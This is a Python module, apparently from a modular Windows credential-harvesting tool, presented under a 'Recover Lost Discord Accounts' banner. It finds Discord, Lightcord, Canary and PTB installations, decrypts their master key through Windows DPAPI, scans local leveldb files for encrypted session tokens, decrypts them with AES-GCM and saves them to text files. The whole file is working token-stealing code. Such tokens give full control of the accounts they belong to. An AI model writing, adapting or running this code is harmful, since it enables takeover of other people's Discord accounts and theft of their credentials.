import json
import os
import re
from base64 import b64decode

from ctypes import POINTER, byref
from ctypes import Structure, c_char, wintypes
from ctypes import c_buffer, cdll, windll

from Crypto.Cipher import AES

from config import Constant 
from config import ModuleManager


class DATA_BLOB(Structure):
    _fields_ = [
        ('cbData', wintypes.DWORD),
        ('pbData', POINTER(c_char))
    ]

class DiscordRecovery(ModuleManager):
    def __init__(self) -> None:
        super().__init__(module_name="DiscordRecovery")

        self.banner(r"""
     _______         ______  _                          _ 
    |.-----.|       (______)(_)                        | |
    ||x . x||        _     _ _  ___  ____ ___   ____ __| |
    ||_.-._||       | |   | | |/___)/ ___) _ \ / ___) _  |
    `--)-(--`       | |__/ /| |___ ( (__| |_| | |  ( (_| |
   __[=== o]___     |_____/ |_(___/ \____)___/|_|   \____|
  |:::::::::::|\    
  `-=========-`()       Recover Lost Discord Accounts
                """)

        self.discord_folder = os.path.join(self.output_folder_user, 'applications', 'discord')

        if not os.path.isdir(self.discord_folder):
            os.makedirs(self.discord_folder)
        
        self.discordInstallations = [
                [f"{Constant.roaming_dir}/Discord","Discord"],
                [f"{Constant.roaming_dir}/Lightcord","Lightcord"],
                [f"{Constant.roaming_dir}/discordcanary","DiscordCanary"],
                [f"{Constant.roaming_dir}/discordptb","DiscordPTB"]
        ]
        
        self.tokensTMP = ''
        self.tokensCount = 0

    def GetData(self, blob_out):
        cbData = int(blob_out.cbData)
        pbData = blob_out.pbData
        buffer = c_buffer(cbData)
        cdll.msvcrt.memcpy(buffer, pbData, cbData)
        windll.kernel32.LocalFree(pbData)
        return buffer.raw

    def CryptUnprotectData(self, encrypted_bytes, entropy=b''):
        buffer_in = c_buffer(encrypted_bytes, len(encrypted_bytes))
        buffer_entropy = c_buffer(entropy, len(entropy))
        blob_in = DATA_BLOB(len(encrypted_bytes), buffer_in)
        blob_entropy = DATA_BLOB(len(entropy), buffer_entropy)
        blob_out = DATA_BLOB()

        if windll.crypt32.CryptUnprotectData(byref(blob_in), None, byref(blob_entropy), None, None, 0x01, byref(blob_out)):
            return self.GetData(blob_out)

    def DecryptValue(self, buff, master_key=None):
        starts = buff.decode(encoding='utf8', errors='ignore')[:3]
        if starts == 'v10' or starts == 'v11':
            iv = buff[3:15]
            payload = buff[15:]
            cipher = AES.new(master_key, AES.MODE_GCM, iv)
            decrypted_pass = cipher.decrypt(payload)
            decrypted_pass = decrypted_pass[:-16].decode()
            return decrypted_pass

    def GetDiscord(self, path, savefname):
        if not os.path.exists(f"{path}/Local State"):
            self.merror(f"[{savefname}] Client is not available at: {path}. Continuing...")
            return

        pathC = path + "/Local Storage/leveldb"

        pathKey = path + "/Local State"
        with open(pathKey, 'r', encoding='utf-8') as f:
            local_state = json.loads(f.read())
        master_key = b64decode(local_state['os_crypt']['encrypted_key'])
        master_key = self.CryptUnprotectData(master_key[5:])
        self.mdebug(f"[{savefname}] Found and loaded master key")

        tokens = []
        for file in os.listdir(pathC):
            if file.endswith(".log") or file.endswith(".ldb"):
                self.mdebug(f"[{savefname}] Searching in {file}")
                for line in [x.strip() for x in open(f"{pathC}\\{file}", errors="ignore").readlines() if x.strip()]:
                    for token in re.findall(r"dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*", line):
                        tokenDecoded = self.DecryptValue(b64decode(token.split('dQw4w9WgXcQ:')[1]), master_key)
                        if not tokenDecoded in self.tokensTMP:
                            self.tokensTMP += tokenDecoded
                            self.mdebug(f"[{savefname}] Found token in {file}")
                            tokens.append(tokenDecoded)
                            self.tokensCount += 1

        with open(os.path.join(self.discord_folder, f"{savefname}.txt"), 'w', encoding='utf-8') as file:
            file.write('\n'.join(tokens))
            self.mprint(f"[{savefname}] Saved {len(tokens)} tokens to {savefname}.txt")

    def run(self):
        try:
            self.mdebug(f"Starting to look for discord tokens")
            
            for patt in self.discordInstallations:
                self.mdebug(f"Running `GetDiscord()` on {patt[1]} at {patt[0]}")
                self.GetDiscord(path=patt[0], savefname=patt[1])
            
            self.mprint(f"Found a total of {self.tokensCount} Discord Tokens")

        except Exception as e:
            self.merror(f"Unable to locate any discord token: {e}. Skipping this module")
            return
